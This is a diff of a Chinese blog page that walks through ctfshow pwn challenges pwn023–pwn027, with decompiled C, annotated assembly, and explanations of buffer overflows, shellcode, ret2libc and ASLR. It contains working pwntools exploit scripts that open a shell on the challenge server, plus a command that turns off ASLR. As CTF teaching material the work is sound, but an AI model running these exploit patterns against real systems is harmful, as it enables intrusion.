@@ -640,28 +640,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-07-20
+                    2023-07-17
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-07-20
+                    2023-07-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    16.2k
+                    22k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    63 分
+                    87 分
                 </div>
                 
 
@@ -1252,7 +1252,7 @@ main:  # main函数的开始
 <h3 id="got-plt不存在的原因"><a href="#got-plt不存在的原因" class="headerlink" title="got.plt不存在的原因"></a>got.plt不存在的原因</h3><p><code>readelf -S pwn022</code> 的输出中，我们可以看到 <code>.got</code> 表存在，但是并没有 <code>.got.plt</code> 表。这意味着 <code>pwn022</code> 这个程序没有 <code>.got.plt</code> 表。</p>
 <p>这可能是因为 <code>pwn022</code> 这个程序在链接时没有使用 <code>-z lazy</code> 选项。默认情况下，GCC 编译器会使用 <code>-z lazy</code> 选项来链接程序，这会导致生成 <code>.got.plt</code> 表。然而，如果程序在链接时使用了 <code>-z now</code> 选项，那么就不会生成 <code>.got.plt</code> 表，所有的函数调用都会直接通过 <code>.got</code> 表进行。</p>
 <p>所以，虽然 <code>objdump -R pwn022</code> 的输出显示有 <code>R_X86_64_JUMP_SLOT</code> 类型的记录，这通常对应 <code>.got.plt</code> 表，但是实际上 <code>pwn022</code> 这个程序并没有 <code>.got.plt</code> 表。这可能是因为 <code>pwn022</code> 这个程序在链接时使用了 <code>-z now</code> 选项，导致所有的函数调用都直接通过 <code>.got</code> 表进行，而没有使用 <code>.got.plt</code> 表。</p>
-<h2 id="十一、pwn023"><a href="#十一、pwn023" class="headerlink" title="十一、pwn023"></a>十一、pwn023</h2><h3 id="C源代码-1"><a href="#C源代码-1" class="headerlink" title="C源代码"></a>C源代码</h3><h4 id="一、main函数"><a href="#一、main函数" class="headerlink" title="一、main函数"></a>一、main函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp) 
+<h2 id="十一、pwn023"><a href="#十一、pwn023" class="headerlink" title="十一、pwn023"></a>十一、pwn023</h2><h3 id="C源代码-1"><a href="#C源代码-1" class="headerlink" title="C源代码"></a>C源代码</h3><h4 id="（一）main函数"><a href="#（一）main函数" class="headerlink" title="（一）main函数"></a>（一）main函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp) 
 {
   __gid_t v3; // 定义一个组标识符变量
   int v5; // 未在代码中使用的整型变量
@@ -1306,7 +1306,7 @@ main:  # main函数的开始
 <p>当发生缓冲区溢出时，可能会覆盖掉程序的其他内存区域，包括栈、堆、数据段或者代码段。如果能够成功地控制这种溢出，我们可能就可以利用这个<code>signal</code>函数的设置来执行任意代码。</p>
 <p>具体来说，当缓冲区溢出发生在<code>ctfshow</code>函数中时，如果我们能够精心地控制输入字符串，可能可以修改返回地址或者其他重要的数据，导致程序执行我们想要的代码。当然，我们的代码可能尝试访问非法内存，这将会触发<code>SIGSEGV</code>信号。然而，由于<code>signal</code>的设置，<code>SIGSEGV</code>并不会使得程序终止，而是转向执行<code>sigsegv_handler</code>。如果我们能够控制<code>sigsegv_handler</code>函数的行为，我们就可以最终利用这个溢出漏洞来执行任意代码。</p>
 <p>需要注意的是，实际上进行这样的攻击需要很高的技术能力，包括但不限于深入理解程序的内存布局、栈的工作原理，以及具体的机器代码等等。另外，现代操作系统通常会有各种安全机制（比如地址空间布局随机化、堆栈保护等等）来防止这样的攻击，所以在实践中，进行这样的攻击并不容易。</p>
-<h4 id="二、sigsegv-handler函数"><a href="#二、sigsegv-handler函数" class="headerlink" title="二、sigsegv_handler函数"></a>二、sigsegv_handler函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">void __noreturn sigsegv_handler()
+<h4 id="（二）sigsegv-handler函数"><a href="#（二）sigsegv-handler函数" class="headerlink" title="（二）sigsegv_handler函数"></a>（二）sigsegv_handler函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">void __noreturn sigsegv_handler()
 {
   fprintf(stderr, "%s\n", flag); // 向标准错误流stderr打印flag字符串
   fflush(stderr); // 刷新stderr，确保flag被输出
@@ -1318,7 +1318,7 @@ main:  # main函数的开始
 
 
 
-<h4 id="三、ctfshow函数"><a href="#三、ctfshow函数" class="headerlink" title="三、ctfshow函数"></a>三、ctfshow函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">char *__cdecl ctfshow(char *src)
+<h4 id="（三）ctfshow函数"><a href="#（三）ctfshow函数" class="headerlink" title="（三）ctfshow函数"></a>（三）ctfshow函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">char *__cdecl ctfshow(char *src)
 {
   char dest[58]; //[esp+Ah] [ebp-3Eh] BYREF    // 定义一个大小为58的字符数组dest
 
@@ -1338,7 +1338,7 @@ main:  # main函数的开始
 <p>在32位的系统中，一个地址是32位（也就是4字节）的，因此函数的返回地址也是4字节的。这就是为什么我们在覆盖缓冲区时需要额外覆盖4个字节。</p>
 <p>当我们控制了这4个字节，我们实际上可以控制函数返回时的跳转位置。这意味着，如果我们能够精心构造这4个字节，我们可以使程序跳转到任何我们想要的位置，例如一个包含恶意代码的内存段。</p>
 <h4 id="2-cyclic生成覆盖地址序列（pwntools工具）"><a href="#2-cyclic生成覆盖地址序列（pwntools工具）" class="headerlink" title="2.cyclic生成覆盖地址序列（pwntools工具）"></a>2.cyclic生成覆盖地址序列（pwntools工具）</h4><p><code>cyclic</code>工具可以生成一个循环的、可预测的、不重复的字符串序列。这种序列通常用于确定缓冲区溢出时，溢出点的确切位置。</p>
-<p><code>cyclic 64</code>就是生成一个长度为64的这样的序列。</p>
+<p><code>cyclic66</code>就是生成一个长度为66的这样的序列。</p>
 <p>这样的序列有一个特性，那就是任何长度为4的子串在这个序列中都只出现一次。所以当你观察到程序崩溃，并且可以从崩溃处获取4个字节的信息时，你可以通过这4个字节在<code>cyclic</code>生成的序列中的位置，来确定溢出点的位置。</p>
 <p>比如，你首先用<code>cyclic 200</code>生成一个200字节的序列，然后把它输入到你的程序中，导致程序崩溃。然后你从崩溃信息中获取到了一个4字节的值，你可以用<code>cyclic</code>库中的<code>cyclic_find</code>函数，通过这个4字节的值，来确定溢出点的位置。</p>
 <h4 id="3-cdecl"><a href="#3-cdecl" class="headerlink" title="3.__cdecl"></a>3.__cdecl</h4><p><code>__cdecl</code> 是一个关于函数调用约定的修饰符，主要用于 C 和 C++ 中。它规定了函数参数的压栈顺序以及由谁来清理堆栈等规则。</p>
@@ -1791,6 +1791,543 @@ ctfshow endp
 ; 结束 ctfshow 函数的定义。
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<ol>
+<li><p>函数开始时进行一些栈操作，保存寄存器的值。</p>
+</li>
+<li><p>调用 __x86_get_pc_thunk_bx 函数，获取当前的指令位置并存储在 ebx 寄存器中。</p>
+</li>
+<li><p>分配 0x84 字节的空间用于缓冲区，存储用户输入的数据。</p>
+</li>
+<li><p>调用 read 函数，从标准输入读取数据，并存储到缓冲区。</p>
+</li>
+<li><p>调用 puts 函数，将缓冲区的内容打印到标准输出。</p>
+</li>
+<li><p>通过调用 call eax 指令，以 eax 寄存器的值作为函数指针，跳转到缓冲区中存储的地址执</p>
+</li>
+</ol>
+<p>行。</p>
+<ol start="7">
+<li>之后是一些清理工作和函数返回的准备操作。</li>
+</ol>
+<p>可能这里看得还是云里雾里，后面慢慢会逐步清晰起来。但实际上这题题目提示了可以使用</p>
+<p>pwntools的shellcraft模块进行攻击</p>
+<p>shellcraft 模块是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode。</p>
+<p>Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。</p>
+<p>shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的 Shellcode。</p>
+<h4 id="lea-eax-ebp-buf-中S参数解析"><a href="#lea-eax-ebp-buf-中S参数解析" class="headerlink" title="lea     eax, [ebp+buf]  中S参数解析"></a>lea     eax, [ebp+buf]  中S参数解析</h4><p>在这段代码中，<code>lea eax, [ebp+buf]</code> 这条指令的作用是将 ebp 加上偏移量 buf 的结果加载到 eax 中。在这里，buf 是一个在栈中的局部变量，所以 <code>ebp+buf</code> 指向的就是这个变量在内存中的地址。然后，这个地址被存储在 eax 中。</p>
+<p>接下来，这个地址被用作 puts 函数的参数。在 C 语言中，puts 函数的原型是 <code>int puts(const char *s)</code>，这意味着 puts 函数需要一个指向字符数组（即字符串）的指针作为参数。这个参数在这里被称为 “s 地址”。</p>
+<p>所以，在这个上下文中，”s 地址” 就是指向你想要打印的字符串的地址。换句话说，它就是你要 puts 函数打印的字符串在内存中的位置。在这段代码中，字符串是在 buf 中存储的，所以 <code>lea eax, [ebp+buf]</code> 这条指令就是在获取这个字符串的地址，然后将其传递给 puts 函数进行打印\1. 函数开始时进行一些栈操作，保存寄存器的值。</p>
+<h3 id="（一）漏洞产生"><a href="#（一）漏洞产生" class="headerlink" title="（一）漏洞产生"></a>（一）漏洞产生</h3><p>从给出的代码片段来看，这个程序中的漏洞可能出现在 <code>ctfshow</code> 函数中，具体的错误是缓冲区溢出（buffer overflow）和任意代码执行。这是因为该函数接收的输入大小没有被正确限制，并且接收的输入会被作为代码执行。</p>
+<p>详细来说，漏洞在下列代码部分出现：</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push    100h            ; nbytes
+lea     eax, [ebp+buf]
+push    eax             ; buf
+push    0               ; fd
+call    _read<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在这段代码中，<code>_read</code> 函数从文件描述符 <code>0</code>（也就是标准输入）读取 <code>100h</code>（也就是 256）字节的数据，并将其存储在 <code>buf</code> 中。然而 <code>buf</code> 的大小是 <code>88h</code>（也就是 136）字节，这就造成了缓冲区溢出。因为 <code>_read</code> 函数会读取比 <code>buf</code> 更多的数据，所以超过 <code>buf</code> 大小的部分会覆盖其他内存区域，这个就是缓冲区溢出漏洞。</p>
+<p>此外，另一个漏洞出现在：</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lea     eax, [ebp+buf]
+call    eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>在这段代码中，<code>call eax</code> 试图执行存在于 <code>buf</code> 的代码。由于之前的缓冲区溢出漏洞，攻击者可以控制这个缓冲区的内容，从而控制程序的执行流程。这就是任意代码执行漏洞。</p>
+<p>这种类型的漏洞通常出现的原因是程序员在处理用户输入时未进行正确的边界检查。处理用户输入是编程中的一个重要且常见的任务，但如果不正确地进行，就很容易引入安全漏洞。在这个例子中，程序员应该限制 <code>_read</code> 函数读取的数据量，使其不超过 <code>buf</code> 的大小，并且不应该试图执行用户提供的数据。</p>
+<h3 id="（二）exp-py"><a href="#（二）exp-py" class="headerlink" title="（二）exp.py"></a>（二）exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context.log_level = 'debug'
+io=remote("pwn.challenge.ctf.show", 28148)
+payload=asm(shellcraft.sh())
+io.sendline(payload)
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在这个示例中，目标程序存在一个典型的安全漏洞：它接收用户的输入，并试图将这个输入作为代码执行。如果攻击者可以控制这个输入，那么他们就可以执行任意代码，这就是常见的缓冲区溢出漏洞。</p>
+<p>为了利用这个漏洞，攻击者需要提供一段将被执行的代码，这就是 shellcode 的由来。在这个示例中，攻击者希望弹出一个 shell，所以他们需要一个能够执行 shell 的 shellcode。</p>
+<p>Python 脚本首先使用 pwntools 的 <code>shellcraft.sh()</code> 函数生成这个 shellcode。这个函数生成一段在目标系统上执行 shell 的代码，这个代码在 Linux 系统上通常会执行 <code>/bin/sh</code>。然后 <code>asm</code> 函数将这个 shellcode 从汇编代码转换为可以在目标系统上执行的机器代码。</p>
+<p>接下来，脚本使用 pwntools 的 <code>remote</code> 函数连接到目标服务器。这个函数需要两个参数：目标服务器的地址和端口号。脚本通过这个连接将生成的 shellcode 发送到目标服务器。</p>
+<p>当目标服务器接收到这个 shellcode 后，目标程序的漏洞就会被触发：程序会尝试执行接收到的数据作为代码。由于数据实际上是攻击者提供的 shellcode，所以这就导致了一个 shell 被弹出。</p>
+<p>最后，脚本使用 pwntools 的 <code>interactive</code> 函数，使 Python 脚本的输入输出转换为交互式的。这样就允许攻击者通过 Python 脚本的控制台来操作在目标服务器上弹出的 shell，执行任意命令。</p>
+<p>总的来说，这个脚本的工作原理是：生成 shellcode，连接到目标服务器，发送 shellcode，触发漏洞，然后控制弹出的 shell。这个方法依赖于目标程序的具体漏洞，以及 pwntools 库提供的方便的工具。</p>
+<h2 id="十三、pwn025（NX保护ret2libc）"><a href="#十三、pwn025（NX保护ret2libc）" class="headerlink" title="十三、pwn025（NX保护ret2libc）"></a>十三、pwn025（NX保护ret2libc）</h2><h3 id="（一）mainC源代码"><a href="#（一）mainC源代码" class="headerlink" title="（一）mainC源代码"></a>（一）mainC源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(stdin, 0, 1, 0); //这是一个库函数，用于改变stdin（标准输入）的缓冲方式。在这里，第二个参数是NULL，表示不使用缓冲；第三个参数是1，表示设置为行缓冲方式；第四个参数是缓冲区大小，这里为0，因为不使用缓冲。
+  setvbuf(stdout, 0, 2, 0);//这也是一个库函数，用于改变stdout（标准输出）的缓冲方式。在这里，第二个参数是NULL，表示不使用缓冲；第三个参数是2，表示设置为全缓冲；第四个参数是缓冲区大小，这里为0，因为不使用缓冲。
+  ctfshow(&amp;argc);
+  logo();
+  write(0, "Hello CTFshow!\n", 0xEu);//这是一个系统调用，用于写入数据到文件描述符。在这里，0是文件描述符，表示标准输入；"Hello CTFshow!\n"是要写入的数据；0xEu是数据的长度，0xEu是十六进制表示，等于十进制的14。
+  return 0;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t ctfshow()
+{
+  char buf[132]; // [esp+0h] [ebp-88h] BYREF
+
+  return read(0, buf, 0x100u);
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="（二）ret2libc攻击方法"><a href="#（二）ret2libc攻击方法" class="headerlink" title="（二）ret2libc攻击方法"></a>（二）ret2libc攻击方法</h3><p>首先，NX，全称No-eXecute，也叫做DEP（Data Execution Prevention，数据执行防止），是一种安全机制，用于防止恶意软件通过注入代码到数据段或堆栈段来执行恶意代码。它可以将内存标记为非可执行，这样处理器就不会在这些区域执行代码。这个机制可以有效防止缓冲区溢出攻击。</p>
+<p>然后，ret2libc是一种绕过NX保护的攻击方法。由于NX保护阻止在非执行内存（如堆和栈）上执行代码，攻击者不能简单地插入并执行恶意代码。但是，攻击者可以利用已经存在的可执行代码片段，这些代码片段就是程序已经加载的库函数，例如C标准库libc。</p>
+<p>在ret2libc攻击中，攻击者利用缓冲区溢出漏洞，改变返回地址，使其指向libc中的函数（如system），并在栈上布置参数。这样，当函数返回时，不会返回到原来的位置，而是跳转到libc的函数，执行攻击者预设的命令。这种攻击方法不需要在内存中注入新的代码，所以可以绕过NX保护。</p>
+<p>所以，”开启NX保护，或许可以试试ret2libc”的意思是，如果目标系统开启了NX保护，可以考虑使用ret2libc这种攻击策略。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+from LibcSearcher import *
+context.log_level = 'debug'
+#io = process('./pwn')
+#io = remote('127.0.0.1',10000)
+io = remote("pwn.challenge.ctf.show", 28177)
+elf = ELF('./pwn')
+main = elf.sym['main']
+write_got = elf.got['write']
+write_plt = elf.plt['write']
+payload = cyclic(0x88+0x4) + p32(write_plt) + p32(main) + p32(0) +
+p32(write_got) + p32(4)
+io.sendline(payload)
+write = u32(io.recv(4))
+print hex(write)
+libc = LibcSearcher('write',write)
+libc_base = write - libc.dump('write')
+system = libc_base + libc.dump('system')
+bin_sh = libc_base + libc.dump('str_bin_sh')
+payload = cyclic(0x88+0x4) + p32(system) + p32(main) + p32(bin_sh)
+io.sendline(payload)
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="十四、pwn026"><a href="#十四、pwn026" class="headerlink" title="十四、pwn026"></a>十四、pwn026</h2><h3 id="（一）main函数C源代码"><a href="#（一）main函数C源代码" class="headerlink" title="（一）main函数C源代码"></a>（一）main函数C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  void *ptr; // [rsp+0h] [rbp-10h] 分配用于保存堆内存分配指针的变量
+  void *v5; // [rsp+8h] [rbp-8h] 分配用于保存动态库加载地址的变量
+
+  ptr = malloc(4uLL); // 申请4字节的内存空间，将地址赋给ptr
+  v5 = dlopen("/lib/x86_64-linux-gnu/libc.so.6", 258); // 动态加载libc库，将库的地址赋给v5
+  puts(s); // 输出字符串s
+  puts(asc_4008F0); // 输出字符串asc_4008F0
+  puts(asc_400970); // 输出字符串asc_400970
+  puts(asc_400A00); // 输出字符串asc_400A00
+  puts(asc_400A90); // 输出字符串asc_400A90
+  puts(asc_400B18); // 输出字符串asc_400B18
+  puts(asc_400BB0); // 输出字符串asc_400BB0
+  puts("    * *************************************                           ");
+  puts(aClassifyCtfsho); // 输出字符串aClassifyCtfsho
+  puts("    * Type  : Linux_Security_Mechanisms                               ");
+  puts("    * Site  : https://ctf.show/                                       ");
+  puts("    * Hint  : Please confirm your ASLR level first !                  ");
+  puts("    * *************************************                           ");
+  puts("Here is your ASLR level:");
+  system("cat /proc/sys/kernel/randomize_va_space"); // 执行系统命令，获取ASLR级别
+  puts("If the result is 0, then you get the correct flag!");
+  puts("If not,you will get a fake flag!");
+  printf("flag is :ctfshow{%p", main); // 输出当前main函数的地址
+  printf("_%p", system); // 输出system函数的地址
+  printf("_%p", ptr); // 输出申请的堆内存地址
+  printf("_%p", v5); // 输出动态加载的libc库地址
+  puts("}"); // 输出字符串"}"
+  free(ptr); // 释放之前申请的内存
+  return 0; // 返回0，表示程序执行成功
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="（二）main函数汇编源代码"><a href="#（二）main函数汇编源代码" class="headerlink" title="（二）main函数汇编源代码"></a>（二）main函数汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">public main
+main proc near
+
+ptr= qword ptr -10h     ; 在栈帧中声明一个8字节变量ptr，用于存储malloc函数的返回值
+var_8= qword ptr -8     ; 在栈帧中声明一个8字节变量var_8，用于存储dlopen函数的返回值
+
+push    rbp             ; 将当前rbp寄存器的值压入栈中，保存现场
+mov     rbp, rsp        ; 将rsp寄存器的值复制到rbp寄存器，设置新的帧基址
+sub     rsp, 10h        ; 将rsp寄存器的值减去16，分配栈空间给局部变量ptr和var_8
+
+mov     edi, 4          ; 将4传递给malloc函数作为参数，即请求分配4字节的内存
+call    _malloc         ; 调用malloc函数
+mov     [rbp+ptr], rax  ; 将malloc返回的内存地址（在rax寄存器中）存入ptr变量
+
+mov     esi, 102h       ; 将258（十六进制表示为102h）传递给dlopen函数作为mode参数
+mov     edi, offset file ; 将"/lib/x86_64-linux-gnu/libc.so.6"字符串的地址传递给dlopen函数作为name参数
+call    _dlopen         ; 调用dlopen函数加载libc库
+mov     [rbp+var_8], rax ; 将dlopen返回的动态库句柄地址（在rax寄存器中）存入var_8变量
+
+; 以下部分代码多次调用_puts函数输出各种字符串，这些字符串的地址通过edi寄存器传递给_puts函数
+
+mov     edi, offset command ; "cat /proc/sys/kernel/randomize_va_space"
+call    _system         ; 调用_system函数执行系统命令，查看ASLR级别
+
+; 以下部分代码再次多次调用_puts函数输出各种字符串，这些字符串的地址通过edi寄存器传递给_puts函数
+
+mov     esi, offset main ; 获取main函数的地址，传递给_printf函数作为参数
+mov     edi, offset format ; "flag is :ctfshow{%p"
+mov     eax, 0
+call    _printf         ; 调用_printf函数输出字符串，其中包含main函数的地址
+
+mov     esi, offset _system ; 获取_system函数的地址，传递给_printf函数作为参数
+mov     edi, offset aP  ; "_%p"
+mov     eax, 0
+call    _printf         ; 调用_printf函数输出字符串，其中包含_system函数的地址
+
+mov     rax, [rbp+ptr]  ; 获取ptr变量中存储的堆内存地址，传递给_printf函数作为参数
+mov     rsi, rax
+mov     edi, offset aP  ; "_%p"
+mov     eax, 0
+call    _printf         ; 调用_printf函数输出字符串，其中包含堆内存地址
+
+mov     rax, [rbp+var_8] ; 获取var_8变量中存储的动态库句柄地址，传递给_printf函数作为参数
+mov     rsi, rax
+mov     edi, offset aP  ; "_%p"
+mov     eax, 0
+call    _printf         ; 调用_printf函数输出字符串，其中包含动态库句柄地址
+
+mov     edi, offset asc_400E51 ; "}"
+call    _puts           ; 调用_puts函数输出字符串"}"
+
+mov     rax, [rbp+ptr]  
+mov     rdi, rax        ; 获取ptr变量中存储的堆内存地址，传递给_free函数作为参数
+call    _free           ; 调用_free函数释放之前申请的堆内存
+
+mov     eax, 0          ; 设置函数返回值为0
+leave                   ; 恢复旧的rbp和rsp，清理栈帧
+retn                    ; 从main函数返回
+main endp
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="（三）"><a href="#（三）" class="headerlink" title="（三）"></a>（三）</h3><p>ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加</p>
+<p>软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的</p>
+<p>位置，从而增加了利用软件漏洞进行攻击的难度。</p>
+<p>开启不同等级会有不同的效果：</p>
+<p>\1. 内存布局随机化： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的</p>
+<p>库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。</p>
+<p>ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和</p>
+<p>代码的位置。</p>
+<p>\2. 地址空间范围的随机化： ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、</p>
+<p>堆、代码段和数据段通常会被分配到固定的地址范围中。ASLR会随机选择地址空间的起始位</p>
+<p>置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。</p>
+<p>\3. 随机偏移量： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着</p>
+<p>每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发</p>
+<p>现这些偏移量，才能准确地定位和利用漏洞。</p>
+<p>\4. 堆和栈随机化： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起</p>
+<p>始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置，</p>
+<p>使得攻击者无法轻易地覆盖返回地址或控制程序流程。</p>
+<p>在Linux中，ALSR的全局配置/proc/sys/kernel/randomize_va_space有三种情况：</p>
+<p>0表示关闭ALSR</p>
+<p>1表示部分开启（将mmap的基址、stack和vdso页面随机化）</p>
+<p>2表示完全开启<strong>ALSR</strong></p>
+<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230725155733515.png" alt="image-20230725155733515"></p>
+<h3 id="（四）malloc函数"><a href="#（四）malloc函数" class="headerlink" title="（四）malloc函数"></a>（四）malloc函数</h3><p>1.<code>malloc</code>是一个在C和C++语言中的库函数，用于动态内存分配。<code>malloc</code>函数的原型是<code>void* malloc(size_t size)</code>，这个函数会请求操作系统分配一块大小为<code>size</code>字节的内存，并返回这块内存的首地址。如果分配失败，它会返回一个<code>NULL</code>指针。</p>
+<p>在你的程序中，<code>malloc(4uLL);</code>这行代码是请求操作系统分配4个字节的内存，并将返回的地址保存在变量<code>ptr</code>中。</p>
+<p>2.动态内存分配是编程中的一个重要概念，特别是在C和C++这样的底层语言中。通过动态内存分配，程序可以在运行时根据需要申请任意大小的内存空间。这比静态分配的方式更灵活，可以更好地利用有限的内存资源。</p>
+<p>在你的程序中，<code>malloc(4uLL);</code>这行代码的作用可能主要是为了获取一个堆内存的地址。然后这个地址在后面被用于生成一部分的标志位字符串。这就是这个<code>malloc</code>调用在你的程序中的具体用途。</p>
+<p>更一般的情况是，动态内存分配（如<code>malloc</code>函数）常常用于以下几种情况：</p>
+<ol>
+<li>当你需要创建一个大小在编译时无法确定的数组时。比如，你要根据用户输入的值来创建一个数组，这时就需要动态内存分配。</li>
+<li>当你需要创建一个生命周期超出其定义范围的对象时。比如，在一个函数中创建一个对象，并希望这个对象在函数返回后仍然存在。</li>
+<li>当你需要创建一个大对象时，如大数组或大结构，通常会在堆上而不是栈上分配它们，以防止栈溢出。</li>
+</ol>
+<p>不过使用<strong>动态内存分配</strong>时需要注意，分配的内存在用完后应该由<strong>程序显式地释放</strong>，否则会造成<strong>内存泄漏</strong>。在你的程序中，这通过<code>free(ptr);</code>这行代码完成。</p>
+<h3 id="（五）题解"><a href="#（五）题解" class="headerlink" title="（五）题解"></a>（五）题解</h3><h4 id="1-执行echo-0-gt-x2F-proc-x2F-sys-x2F-kernel-x2F-randomize-va-space"><a href="#1-执行echo-0-gt-x2F-proc-x2F-sys-x2F-kernel-x2F-randomize-va-space" class="headerlink" title="1.执行echo 0 > /proc/sys/kernel/randomize_va_space"></a>1.执行echo 0 &gt; /proc/sys/kernel/randomize_va_space</h4><h4 id="2-运行文件"><a href="#2-运行文件" class="headerlink" title="2.运行文件"></a>2.运行文件</h4><h2 id="十五、pwn027"><a href="#十五、pwn027" class="headerlink" title="十五、pwn027"></a>十五、pwn027</h2><h3 id="（一）main函数汇编源代码"><a href="#（一）main函数汇编源代码" class="headerlink" title="（一）main函数汇编源代码"></a>（一）main函数汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; int __cdecl main(int argc, const char **argv, const char **envp)
+public main  ; 定义main函数为公共函数，其他文件可引用
+main proc near  ; main函数开始
+
+ptr= qword ptr -10h  ; 在栈上声明一个变量ptr，从rbp向下偏移0x10的位置
+var_8= qword ptr -8  ; 在栈上声明一个变量var_8，从rbp向下偏移0x8的位置
+
+; __unwind {
+push    rbp  ; 保存旧的rbp值
+mov     rbp, rsp  ; 把当前栈顶地址（rsp）赋值给rbp，创建新的栈帧
+sub     rsp, 10h  ; 栈顶向下移动0x10个字节，为局部变量留出空间
+mov     edi, 4    ; 把4赋值给edi，此处即为malloc函数的参数，请求分配4字节的内存
+call    _malloc   ; 调用malloc函数，返回的指针存放在rax寄存器中
+mov     [rbp+ptr], rax  ; 把malloc返回的地址存储在ptr变量中
+mov     esi, 102h  ; 把0x102赋值给esi，此处即为dlopen函数的mode参数
+mov     edi, offset file ; "./libc-2.27.so"  ; 把"./libc-2.27.so"的地址赋值给edi，此处即为dlopen函数的filename参数
+call    _dlopen  ; 调用dlopen函数，返回的句柄存放在rax寄存器中
+mov     [rbp+var_8], rax  ; 把dlopen返回的句柄存储在var_8变量中
+
+... ; 之后的部分都是类似的结构，对于每个调用_puts、_printf、_system等函数的部分，它们分别把一些字符串输出到控制台或者执行一些命令
+
+mov     rax, [rbp+ptr]  ; 从ptr变量中获取之前malloc的内存地址
+mov     rdi, rax        ; 把地址赋值给rdi，此处即为free函数的参数
+call    _free  ; 调用free函数，释放之前分配的内存
+
+mov     eax, 0  ; 把0赋值给eax，作为main函数的返回值
+leave  ; 恢复rbp和rsp到调用前的值，即销毁当前栈帧
+retn  ; 从main函数返回
+
